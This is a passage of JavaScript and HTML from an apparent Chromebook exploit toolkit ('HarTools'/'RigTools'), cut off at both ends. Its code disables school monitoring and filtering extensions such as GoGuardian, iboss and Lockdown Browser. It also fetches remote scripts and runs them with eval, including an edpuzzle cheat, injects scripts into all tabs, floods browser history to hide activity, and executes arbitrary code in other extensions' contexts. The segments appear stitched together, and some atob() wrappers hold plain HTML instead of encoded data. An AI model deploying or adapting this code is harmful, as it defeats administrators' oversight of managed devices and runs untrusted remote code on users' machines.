  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
}

.extension-header {
  display: flex;
  align-items: center;
  margin-bottom: 25px;
  margin-top: 10px;
}

.extension-icon {
  width: 32px;
  height: 32px;
  flex-shrink: 0;
  user-select: none;
  margin-left: 10px;
  margin-right: 10px;
}

.extension-name {
  font-size: 13px;
  color: white;
}

.extension-id {
  font-size: 13px;
  color: #c4c7c5;
  margin-left: 10px;
}

.switch {
    position: absolute;
    display: inline-block;
    width: 28px;
    height: 16px;
    right: 20px;
    bottom: 15px;
}

.switch input {
  opacity: 0;
  width: 0;
  height: 0;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #444746;
  border-radius: 15px;
  border: 1.5px solid #8e918f;
  transition: background-color 0.1s ease-in-out, border-color 0.1s ease-in-out;
}

.slider:before {
  content: "";
  position: absolute;
  height: 12px;
  width: 12px;
  left: 2px;
  top: 50%;
  transform: translateY(-50%) scale(0.8);
  background-color: #8e918f;
  border-radius: 50%;
  transition: transform 0.1s ease-in-out, background-color 0.1s ease-in-out;
}

.switch:hover .slider:before {
  box-shadow: 0 0 6px rgba(255, 255, 255, 0.5);
}

input:checked + .slider {
  background-color: #a8c7fa;
  border-color: #a8c7fa;
}

input:checked + .slider:before {
  transform: translate(10px, -50%) scale(1);
  background-color: #062e6f;
}

.header {
  display: flex;
  align-items: center;
  justify-content: center;
}

.logo {
  width: 4em;
  height: auto;
  margin-right: 10px;
}

.tablist-item {
  border: 1px solid #333;
  margin-bottom: 10px;
  background-color: #000;
  padding: 15px;
  border-radius: 8px;
  display: flex;
  font-weight: bold;
  align-items: center;
}

.tablist-item img {
  max-width: 25px;
  margin-right: 10px;
}

.tablist-item span {
  padding: 10px 0;
  text-overflow: ellipsis;
  width: 100%;
  white-space: nowrap;
  overflow: hidden;
  word-break: break-all;
}

.tablist-item span:hover {
  overflow: visible;
  white-space: normal;
  height: auto;
}

button {
    background: transparent;
    color: #9dbae9;
    font-weight: bold;
    border: 1px solid #047db7;
    border-radius: 20px;
    height: 35px;
    padding: 7px 10px;
    cursor: pointer;
    align-self: flex-end;
    transition: background 0.2s ease-in-out;
    outline: none;
}

button:hover {
    background: #38393b;
}

input {
  padding: 8px 16px;
  margin: 4px 2px;
  color: white;
  background-color: #0a0a0a;
  border: 1px solid #333;
}

input:hover {
  background-color: #111;
  border-color: #fff;
}

#toggleable-buttons button {
  position: relative;
  display: inline-flex;
  align-items: center;
  justify-content: flex-start;
  padding: 9px 15px 9px 60px;
  background-color: white;
  color: black;
  border-radius: 6px;
  margin: 4px 2px;
  transition: background-color 0.3s, color 0.3s;
}

#toggleable-buttons button:hover {
  background-color: #e2e2e2;
}

#toggleable-buttons button::before {
  content: '';
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  width: 42px;
  height: 22px;
  background-color: #333;
  border-radius: 12px;
}

#toggleable-buttons button::after {
  content: '';
  position: absolute;
  left: 14px;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  background-color: #fff;
  border-radius: 50%;
}

#toggleable-buttons button[toggled="true"]::before {
  background-color: #000;
}

#toggleable-buttons button[toggled="true"]::after {
  transform: translateY(-50%) translateX(20px);
}

.container {
  display: flex;
  gap: 10px;
}

#code-run {
  background-color: #fff;
  color: black;
  border: none;
  border-radius: 5px;
  padding: 8px 16px;
  font-weight: bold;
  cursor: pointer;
}

#code-run:hover {
  background-color: #e2e2e2;
}

#code {
  background: #000;
  color: white;
  width: 100%;
  min-height: 50px;
  height: 200px;
  resize: both;
  border: 1px solid #4B4B4D;
  border-radius: 5px;
  font-family: monospace, sans-serif;
  padding: 8px;
  box-sizing: border-box;
}

#code:focus {
  border-color: #fff;
}

.toast[popover]:popover-open {
  opacity: 1;
  top: 5px;
  left: 50%;
}

@starting-style {
  .toast[popover]:popover-open {
    opacity: 0;
    transform: translateY(-100%);
  }
}

.toast[popover] {
  position: fixed;
  inset: unset;
  padding: 5px 10px;
  border-radius: 5px;
  opacity: 0;
  font-weight: bold;
  background: #0a0a0a;
  color: white;
  border: 1px solid #444;
}

dialog {
  opacity: 0;
  padding: 30px;
  border: 1px solid #2d2d2d;
  background: #000;
  background-image: radial-gradient(#333 1px, transparent 1px);
  background-size: 2rem 2rem;
  border-radius: 10px;
  transition: all 0.5s;
  min-width: 50vw;
  min-height: 60vh;
  max-width: 50vw;
  max-height: 60vh;
  display: flex;
  flex-direction: column;
}

dialog[open] {
  opacity: 1;
  transform: scale(1);
}

dialog::backdrop {
  background: rgba(0, 0, 0, 0.25);
  backdrop-filter: blur(3px);
}

dialog div {
  background-color: #000;
  font-family: 'Geist', sans-serif;
}

dialog p {
  margin-bottom: 9px;
  padding: 9px;
  border: 1px solid #27272a;
  font-weight: 700;
}

dialog h1 {
  font-size: 1.5rem;
  color: white;
  font-weight: 900;
}

whitebuttons button {
  background-color: transparent;
  border: 1px solid rgb(4, 125, 183);
  color: rgb(168, 199, 250);
}

whitebuttons button:hover {
  background-color: rgba(168, 199, 250, 0.1);
}

litstuff {
  color: #444;
  font-family: monospace, sans-serif;
  font-size: 12px;
  font-style: italic;
  margin-left: 6px;
}
    </style>
  `;

onload = async function x() {
    let foundNothing = true;
    document.open();
    this.document.write(htmlStyle);
    document.close();

    if (chrome.fileManagerPrivate) {
        chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
        document.write(fileManagerPrivateTemplate);
        document.body.querySelector("#btn_FMP_openURL").onclick = function(ev) {};
    }

    if (chrome.management.setEnabled) {
        document.body.insertAdjacentHTML("beforeend", managementTemplate);
        const extlist_element = document.querySelector(".extlist");

        await updateExtensionStatus(extlist_element);
        const container_extensions = document.body.querySelector(
            "#chrome_management_disable_ext"
        );

        container_extensions.querySelector("#current-extension").onclick =
            async function df(e) {
                try {
                    const grabidtokill = chrome.runtime.id;
                    chrome.management.setEnabled(grabidtokill, false);
                } catch {
                    alert("unsuccessful");
                }
            };

        container_extensions.querySelector("#rmv-cmn-blt").onclick = function df() {
            const bloatIds = [
                "cgbbbjmgdpnifijconhamggjehlamcif",
                "lfkbbmclnpaihpaajhohhfdjelchkikf",
                "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
                "pohmgobdeajemcifpoldnnhffjnnkhgf",
                "becdplfalooflanipjoblcmpaekkbbhe",
                "feepmdlmhplaojabeoecaobfmibooaid",
                "adkcpkpghahmbopkjchobieckeoaoeem",
                "haldlgldplgnggkjaafhelgiaglafanh",
                "filgpjkdmjinmjbepbpmnfobmjmgimon",
                "kkbmdgjggcdajckdlbngdjonpchpaiea",
                "njdniclgegijdcdliklgieicanpmcngj",
                "hpkdokakjglppeekfeekmebfahadnflp",
            ];

            let exts = {};
            let extlngth = 0;

            function getLength() {
                return new Promise((resolve) => {
                    bloatIds.forEach((id, i) => {
                        extensionExists(id).then((res) => {
                            if (res) extlngth++;
                            if (bloatIds.length - 1 === i) resolve();
                        });
                    });
                });
            }

            function initExtObj() {
                return new Promise((resolve) => {
                    bloatIds.forEach((id) =>
                        chrome.management.get(id, (e) => {
                            Object.assign(exts, JSON.parse(`{"${e.id}":"${e.shortName}"}`));
                            if (Object.keys(exts).length == extlngth) resolve();
                        })
                    );
                });
            }

            getLength().then(() =>
                initExtObj().then(() =>
                    makeDialog(
                        "Are you sure you want to disable the following extensions?",
                        Object.values(exts),
                        function() {},
                        function() {
                            let disabledExts = [];
                            Object.keys(exts).forEach((id) => {
                                chrome.management.get(id, (e) => {
                                    if (e.enabled) {
                                        if (id == chrome.runtime.id) return;

                                        disabledExts.push(e.shortName);
                                        chrome.management.setEnabled(id, false);
                                    }
                                });
                            });

                            setTimeout(() => {
                                if (!disabledExts.length < 1) {
                                    makeToast(
                                        "disabled the following extensions:\r\n" +
                                        disabledExts.join("\r\n"),
                                        disabledExts.length
                                    );
                                    updateExtensionStatus(extlist_element);
                                }
                            }, 250);
                        }
                    )
                )
            );
        };

        if (localStorage.getItem("userdefIds") == JSON.stringify([])) {
            container_extensions
                .querySelector("#disable-userdef-exts")
                .setAttribute("style", "display: none;");
        }

        container_extensions.querySelector("#disable-userdef-exts").onclick =
            function df(e) {
                let exts = {};

                function initExtObj() {
                    let idlist = JSON.parse(localStorage.getItem("userdefIds"));
                    return new Promise((resolve) => {
                        idlist.forEach((id) => {
                            chrome.management.get(id, (e) => {
                                Object.assign(exts, JSON.parse(`{"${e.id}":"${e.shortName}"}`));
                                if (Object.keys(exts).length == idlist.length) resolve();
                            });
                        });
                    });
                }

                initExtObj().then(() => {
                    makeDialog(
                        "Are you sure you want to disable the following extensions?",
                        Object.values(exts),
                        function() {},
                        function() {
                            let disabledExts = [];
                            JSON.parse(localStorage.getItem("userdefIds")).forEach((id) => {
                                chrome.management.get(id, (e) => {
                                    if (e.enabled) {
                                        if (id == chrome.runtime.id) return;

                                        disabledExts.push(e.shortName);
                                        chrome.management.setEnabled(id, false);
                                    }
                                });
                            });

                            setTimeout(() => {
                                if (!disabledExts.length < 1) {
                                    makeToast(
                                        "disabled the following extensions:\r\n" +
                                        disabledExts.join("\r\n"),
                                        disabledExts.length
                                    );
                                    updateExtensionStatus(extlist_element);
                                }
                            }, 250);
                        }
                    );
                });
            };
    }
    const otherFeatures = window.chrome.runtime.getManifest();
    const permissions = otherFeatures.permissions;

    new DefaultExtensionCapabilities().activate();
    document.body.insertAdjacentHTML(
        "beforeend",
        `
      <title>Untitled document</title>
      <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/">
      `
    );

    const ScriptButtons = document.querySelector("#other-buttons");

    ScriptButtons.querySelector("#swamp").onclick = async function df(e) {
        fetch(
                "https://raw.githubusercontent.com/T3M1N4L/rigtools-updated-ui/refs/heads/main/scripts/swamp-ultra.js"
            )
            .then((res) => res.text())
            .then(eval);
    };

    ScriptButtons.querySelector("#update").onclick = async function df(e) {
        (async () => {
            const fs = await new Promise(function(resolve) {
                webkitRequestFileSystem(PERSISTENT, 2 * 1024 * 1024, resolve);
            });

            function writeFile(file, data) {
                return new Promise((resolve, reject) => {
                    fs.root.getFile(file, {
                        create: true
                    }, function(entry) {
                        entry.remove(function() {
                            fs.root.getFile(file, {
                                create: true
                            }, function(entry) {
                                entry.createWriter(function(writer) {
                                    writer.write(new Blob([data]));
                                    writer.onwriteend = resolve.bind(null, entry.toURL());
                                });
                            });
                        });
                    });
                });
            }

            const url = await writeFile(
                "hartools.html",
                `${await fetch(
          "https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/payloads/index.html"
        ).then((res) => res.text())}<script src="./hartools.js"></script>`
            );

            await writeFile(
                "hartools.js",
                await fetch(
                    "https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/payloads/index.js"
                ).then((res) => res.text())
            );

            chrome.tabs.create({
                url
            });
        })();
    };
    ScriptButtons.querySelector("#quick-rmv-blt").onclick = async function df(e) {
        (async () => {

            const fs = await new Promise(function (resolve) {
                  webkitRequestFileSystem(PERSISTENT, 2 * 1024 * 1024, resolve);
                });
            
            function writeFile(file, data) {
                  return new Promise((resolve, reject) => {
                    fs.root.getFile(file, { create: true }, function (entry) {
                      entry.remove(function () {
                        fs.root.getFile(file, { create: true }, function (entry) {
                          entry.createWriter(function (writer) {
                            writer.write(new Blob([data]));
            
                            writer.onwriteend = resolve.bind(null, entry.toURL());
                          });
                        });
                      });
                    });
                  });
                }
            
            const JS = `try {
                    const bloatIds = [
                      "cgbbbjmgdpnifijconhamggjehlamcif",
                      "lfkbbmclnpaihpaajhohhfdjelchkikf",
                      "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
                      "pohmgobdeajemcifpoldnnhffjnnkhgf",
                      "becdplfalooflanipjoblcmpaekkbbhe",
                      "feepmdlmhplaojabeoecaobfmibooaid",
                      "adkcpkpghahmbopkjchobieckeoaoeem",
                      "haldlgldplgnggkjaafhelgiaglafanh",
                      "filgpjkdmjinmjbepbpmnfobmjmgimon",
                      "kkbmdgjggcdajckdlbngdjonpchpaiea",
                      "njdniclgegijdcdliklgieicanpmcngj",
                      "hpkdokakjglppeekfeekmebfahadnflp"
                    ];
            
                    bloatIds.forEach((id) => {
                      if (id == chrome.runtime.id) return;
                        chrome.management.setEnabled(id, false);
                    });
                    window.close();
                  } catch {
                    alert("unsuccessful");
                  }
            `;
            
            const fileName = "bloat";
            
            const url = await writeFile(`${fileName}.html`,`<!doctypehtml><title>disabling..</title><link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"rel=stylesheet><style>p{margin:0}body{background-color:#000;color:#fff;font-family:Inter,sans-serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}h1::before{content:"# ";color:oklch(81.21% .1409 165.14);font-weight:900}.inner{display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center}textarea{width:max-content;padding-top:1em;overflow-y:hidden;border-radius:10px;background:oklch(17.03% .0083 285.49 / .5);border:1px solid oklch(68.65% .0374 274.73 / .5);color:oklch(95.92% .019253 273.2377);resize:none;font-family:monospace;transition:all .5s cubic-bezier(.175,.885,.32,1.9),color .25s,border-color .25s}</style><div class=inner><textarea cols=12 readonly rows=2>  (^____^)</textarea><h1>disabling...</h1><p>happy days  without blocking am i right?</div><script src=./${fileName}.js></script>`);
            
            await writeFile(`${fileName}.js`, JS);
            
            chrome.tabs.create({ url });
            
            })();
    };

    ScriptButtons.querySelector("#hstfld").onclick = async function df(e) {
        document.title = "Untitled document";
        let link =
            document.querySelector("link[rel~='icon']") ||
            document.createElement("link");
        link.rel = "icon";
        document.head.appendChild(link);
        link.href =
            "https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/";

        let num = prompt(
            "How Times Do You Want This Page To Show Up In your History?"
        );
        let done = false;
        const x = window.location.href;
        for (let i = 1; i <= num; i++) {
            history.pushState(0, 0, i === num ? x : i.toString());
            if (i === num) done = true;
        }
        if (done) {
            alert(
                "Flooding Successful!\n " +
                window.location.href +
                " \nIs Now In Your History " +
                num +
                (num == 1 ? " time." : " Times.")
            );
        }
    };

    const TabButtons = document.querySelector("#tabs-buttons");

    if (chrome.tabs.executeScript) {

        function listenerApp(callback) {
            const func = (id, changeInfo) => {
                if (changeInfo.status === "complete") {
                    chrome.tabs.get(id, (tab) => {
                        if (tab) {
                            callback(tab);
                        }
                    });
                }
            };
            chrome.tabs.onUpdated.addListener(func);
            return func;
        }

        const scripts = {};
        const conditions = {};
        const listeners = {};

        scripts.eruda = `
    fetch("https://cdn.jsdelivr.net/npm/eruda").then(res => res.text()).then((data) => {
      eval(data);
      if (!window.erudaLoaded) {
        eruda.init({
          defaults: {
            displaySize: 45,
            theme: "AMOLED"
          }
        });
        window.erudaLoaded = true;
      }
    });
  `;

        scripts.chii = `
    const script = document.createElement('script');
    script.src = 'https://chii.liriliri.io/playground/target.js';
    script.setAttribute('embedded', 'true');
    document.head.appendChild(script);
  `;

        scripts.adblock = `
    (function(){

      var selectors = [

      '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',
      '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',
      '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',
      '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',
      'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',

      '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',
      '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',
      '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',
      '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',
      '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',
      'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',
      'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',
      'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',
      'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',
      'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',
      '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',
      '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',
      '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',

      'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside',
      'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',
      'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',
      'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ];
      for(let i in selectors) {
          let nodesList = document.querySelectorAll(selectors[i]);
          for(let i = 0; i < nodesList.length; i++) {
              let el = nodesList[i];
              if(el && el.parentNode)
              el.parentNode.removeChild(el);
          }
      }
    })();
  `;
  /*scripts.glocked = `
fetch("https://raw.githubusercontent.com/xNasuni/google-forms-unlocker/refs/heads/main/script.js")
  .then(response => {
    if (!response.ok) {
      throw new Error("Network response was not ok");
    }
    return response.text();
  })
  .then(scriptContent => {
    if (!window.skibLoaded) {
      eval(scriptContent);
      window.skibLoaded = true;
    }
  })
  .catch(error => alert("Error loading script:", error));
`;
*/
        scripts.edpuzzle = `
    fetch("https://cdn.jsdelivr.net/gh/Miner49ur/shorthand@main/edpuzzlingscript.js").then(r => r.text()).then(r => {
      if (!window.edpuzzlesLoaded) {
        eval(r);
        window.edpuzzlesLoaded = true;
      }
    });
  `;
        conditions.edpuzzle = (tab) => tab.url.match(/edpuzzle\.com\/assignments/g);
        // conditions.glocked = (tab) => tab.url.match(/https?:\/\/docs\.google\.com\/forms\//g);
        const ToggleButtons = TabButtons.querySelector("#toggleable-buttons");

        ToggleButtons.querySelectorAll("button").forEach(
            (b) =>
            (b.onclick = () => {
                const id = b.id;

                if (b.hasAttribute("toggled")) {

                    if (id in listeners)
                        chrome.tabs.onUpdated.removeListener(listeners[id]);
                    b.removeAttribute("toggled");
                } else {

                    const script = scripts[id] || "";
                    const condition = conditions[id] || ((tab) => true);
                    const func = listenerApp((tab) => {
                        if (condition(tab)) {
                            chrome.tabs.executeScript(tab.id, {
                                code: script
                            });
                        }
                    });

                    listeners[id] = func;

                    b.setAttribute("toggled", "true");
                }
            })
        );
    } else {
        TabButtons.style.display = "none";
    }

    document
        .querySelector("#code-run")
        .addEventListener("click", () => runCode(false));
};

const runCode = async (onTab, tabId = "") => {
    const codeTextarea = document.querySelector("#code");
    let code = codeTextarea.value.trim();

    const outputDiv = document.querySelector("#code-output");

    if (code.toLowerCase() === "prahit") {

        const container = document.createElement("div");
        container.className = "prahit-container";

        const overlayImage = document.createElement("img");
        overlayImage.src =
            "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/prahit.png";
        overlayImage.alt = "Prahit Image";
        overlayImage.className = "prahit-image";

        const textBox = document.createElement("div");
        textBox.textContent = "\"I made my own oil rigging stock market tools.\"";
        textBox.className = "prahit-textbox";

        container.appendChild(overlayImage);
        container.appendChild(textBox);

        document.body.appendChild(container);

        const snowflakesDiv = document.createElement("div");
        snowflakesDiv.className = "snowflakes";
        snowflakesDiv.setAttribute("aria-hidden", "true");

        for (let i = 0; i < 14; i++) {
            const snowflake = document.createElement("div");
            snowflake.className = "snowflake";

            const snowflakeImage = document.createElement("img");
            snowflakeImage.width = 30;
            snowflakeImage.src = "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/prahit.png";
            snowflake.appendChild(snowflakeImage);

            snowflakesDiv.appendChild(snowflake);
        }

        document.body.appendChild(snowflakesDiv);

        const explosionImage = document.createElement("img");
        explosionImage.src = "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/boom.awebp";
        explosionImage.style.position = "fixed";
        explosionImage.style.top = "0";
        explosionImage.style.left = "0";
        explosionImage.style.width = "100%";
        explosionImage.style.height = "100%";
        explosionImage.style.zIndex = "9999";
        explosionImage.style.display = "none";
        document.body.appendChild(explosionImage);

        const explode = new Audio("https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/boom.mp3");

        const catsMusic = new Audio("https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/cats.mp3");
        catsMusic.loop = true;

        function showExplosionAndPlayMusic() {

            explosionImage.style.display = 'block';

            explode.play();
            catsMusic.play();

            setTimeout(function() {
                explosionImage.style.display = 'none';
            }, 1500);

            setTimeout(function() {
                explode.pause();
                explode.currentTime = 0;
            }, 1500);
        }

        showExplosionAndPlayMusic();

        return;
    }

    if (onTab) {
        code = chrome.tabs.executeScript ?
            `;chrome.tabs.executeScript(
          ${tabId},
          { code: ${JSON.stringify(code)} }
        )` :
            chrome.scripting ?
            `chrome.scripting.executeScript({
          target: {tabId: ${tabId}},
          func: () => {${code}}
        });` :
            `alert("something went wrong, runCode was executed on a tab without proper permissions")`;
    }

    try {
        const originalLog = console.log;
        console.log = (...args) => {
            outputDiv.innerHTML += args.join(" ") + "<br>";
        };

        const fs = await DefaultExtensionCapabilities.getFS();

        function writeFile(file, data) {
            return new Promise((resolve, reject) => {
                fs.root.getFile(file, {
                    create: true
                }, function(entry) {
                    entry.remove(function() {
                        fs.root.getFile(file, {
                            create: true
                        }, function(entry) {
                            entry.createWriter(function(writer) {
                                writer.write(new Blob([data]));
                                writer.onwriteend = resolve.bind(null, entry.toURL());
                            });
                        });
                    });
                });
            });
        }

        const url = await writeFile("src.js", code);
        let script =
            document.body.querySelector("#evaluate_elem") ??
            document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);

        console.log = originalLog;
    } catch (error) {
        outputDiv.innerHTML = `Error: ${error}`;
    }
};==`))
                    const url = await writeFile('index.html', `${atob('<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Extension Evaluation - HarTools</title>
</head>

<body>
  <div id="particles-js"></div>
  <div class="main">
    <h1>No payloads are available</h1>
    <p>No payloads currently available for your extension. Try another extension.
      We are currently developing payloads for other APIs.</p>
    <p>Available payloads for permissions:</p>
    <ul>
      <li>management</li>
    </ul>
  </div>
  
  <style>
    body {
      background-color: #1e2030;
      color: white;
      font-family: Arial, Helvetica, sans-serif;
      overflow: hidden;
    }

    a {
      color: #b7bdf8;
    }

    .main {
      top: 50%;
      left: 50%;
      position: absolute;
      transform: translate(-50%, -50%);
      border: 3px solid white;
      font-weight: bold;
      padding: 5%;
      border-radius: 10px;
      text-align: center;
      background-color: #24273a;
    }

    .button {
      background-color: #a6da95;
      border: none;
      color: white;
      padding: 10px 20px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 14px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 5px;
    }

    ul {
      text-align: center;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
  </style>
</body>

</html>=')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);
            
            }
            document.open();
            //in order to update entry.html, replace the below string after atob(` with the base64 code of entry.html
            document.write(atob(`<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dashboard</title>
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Geist:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap');

      body {
        font-family: 'Geist', sans-serif;
        background-color: #202124;
        color: #e8eaed;
        margin: 0;
        padding: 20px;
      }

      .main {
        max-width: 900px;
        margin: 50px auto;
        background-color: #2b2b2b;
        border-radius: 12px;
        padding: 30px;
        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
        border: 1px solid #3c4043;
        transition: box-shadow 0.3s ease, border-color 0.3s ease;
      }

      .main:hover {
  box-shadow: 0 0 10px 2px #8a2be2, 0 0 20px 4px #8a2be2;
  border-color: #8a2be2;
      }

      .header {
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-bottom: 20px;
      }

      .logo {
        width: 3.5em;
        height: auto;
        margin-bottom: 10px;
      }

      h1 {
        font-size: 2.2em;
        margin: 0;
        color: #bb86fc;
      }

      p {
        font-size: 14px;
        line-height: 1.6;
        color: #dadce0;
      }

      a {
        color: #bb86fc;
        text-decoration: underline;
      }

      a:hover {
        text-decoration: none;
      }

      .button {
        background-color: #8a2be2;
        color: white;
        padding: 8px 14px;
        font-size: 14px;
        margin: 6px 4px;
        border: none;
        cursor: pointer;
        border-radius: 6px;
        font-weight: bold;
        transition: all 0.2s ease;
        display: inline-block;
      }

      .button:hover {
        background-color: #a066f5;
        transform: scale(1.05);
      }

      .button:focus {
        outline: none;
      }

      input,
      select,
      textarea {
        background-color: #303134;
        color: #e8eaed;
        border: 1px solid #5f6368;
        padding: 10px;
        border-radius: 4px;
        width: 100%;
        margin-bottom: 15px;
      }

      input:focus,
      select:focus,
      textarea:focus {
        border-color: #bb86fc;
        outline: none;
      }

      ::placeholder {
        color: #9aa0a6;
      }

      hr {
        border: none;
        border-top: 1px solid #3c4043;
        margin: 20px 0;
      }

      .background-grid {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-image: radial-gradient(#303134 1px, transparent 1px);
        background-size: 2rem 2rem;
        z-index: -1;
        animation: moveGrid 4s linear infinite;
      }

      @keyframes moveGrid {
        0% {
          background-position: 0 0;
        }
        100% {
          background-position: 2rem 2rem;
        }
      }

      .background-grid:hover {
        background-position-x: 2rem;
      }
        iframe {
            width: 0;
            height: 0;
            border: 0;
            visibility: hidden;
            position: absolute;
            left: -9999px;
        }
    </style>
  </head>
  <body>
    <div class="background-grid"></div>
    <div class="main">
      <div class="header">
        <img src="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
        <h1>HarTools</h1>
        <p>Developer Tools and Extension Code execution</p>
      </div>

      <p>This was found by <a href="https://crossjbly.pages.dev/">crossjbly</a><br>
      Original RigTools Exploit was found by <a href="https://github.com/FWSmasher">FWSmasher</a></p>
      <hr>
      <p>AKA: if someone tells you that they made this, they're lying and you should laugh at them</p>
      <hr>
      <p>Additional credits: Discord: @axqmx (testing and helping with development) @pwen (ideas) | Github:
        <a href="https://github.com/FWSmasher">FWSmasher</a>,
        <a href="https://github.com/Blobby-Boi">Blobby Boi</a>
      </p>
      <hr>

      <p>Press Q for evaluating code under <a class="button" id="extdbg" href="javascript:void(0)">extension id</a></p>
      <p>Or press 1-9 for some hardcoded extensions</p>
      <p>
        <a class="button hardcoded" ext="adkcpkpghahmbopkjchobieckeoaoeem" href="javascript:void(0)">ls filter</a>
        <a class="button hardcoded" ext="hpkdokakjglppeekfeekmebfahadnflp" href="javascript:void(0)">ls alert</a>
        <a class="button hardcoded" ext="haldlgldplgnggkjaafhelgiaglafanh" href="javascript:void(0)">goguardian</a>
        <a class="button hardcoded" ext="moehkbbcbklmkcjibcbbooebgpogejoc" href="javascript:void(0)">aristotle</a>
        <a class="button hardcoded" ext="kmffehbidlalibfeklaefnckpidbodff" href="javascript:void(0)">iboss</a>
        <a class="button hardcoded" ext="mloajfnmjckfjbeeofcdaecbelnblden" href="javascript:void(0)">snap&read</a>
        <a class="button hardcoded" ext="fogjeanjfbiombghnmkmmophfeccjdki" href="javascript:void(0)">lockdown browser</a>
        <a class="button hardcoded" ext="kmpjlilnemjciohjckjadmgmicoldglf" href="javascript:void(0)">dyknow cloud</a>
        <a class="button hardcoded" ext="gndmhdcefbhlchkhipcnnbkcmicncehk" href="javascript:void(0)">gforms locked mode (enrolled cbs)</a>
        <a class="button hardcoded" ext="inoeonmfapjbbkmdafoankkfajkcphgd" href="javascript:void(0)">read and write</a>
      </p>

      <p>Press M for evaluating under <a class="button" id="devdbg" href="javascript:void(0)">devtools</a> context</p>
      <p>Typing cancel in any prompt will cancel the current operation.</p>

      <a class="button" href="devtools://devtools/bundled/inspector.html?experiments=true">Re-open devtools</a>
      <a class="button" href="javascript:void(0)" id="updater">Update payload</a>
      <a class="button" href="javascript:void(0)" id="cleanup">Cleanup and reset for extension</a>
      <a class="button" href="javascript:void(0)" id="activate">Chrome URLs</a>
      <a class="button" href="javascript:void(0)" id="activate2">Chrome URLs 2</a>
      <a class="button" href="javascript:void(0)" id="troll">Inject Tr3nch into extension</a>
    </div>

    <script defer>
      document.addEventListener("keydown", function(event) {
        if (event.key === "q") {
          document.getElementById("extdbg").click();
        } else if (event.key === "m") {
          document.getElementById("devdbg").click();
        } else if (["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(event.key)) {
          document.querySelectorAll(`.hardcoded`)[parseInt(event.key) - 1]?.click();
        }
      });
    </script>
  </body>
</html>==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
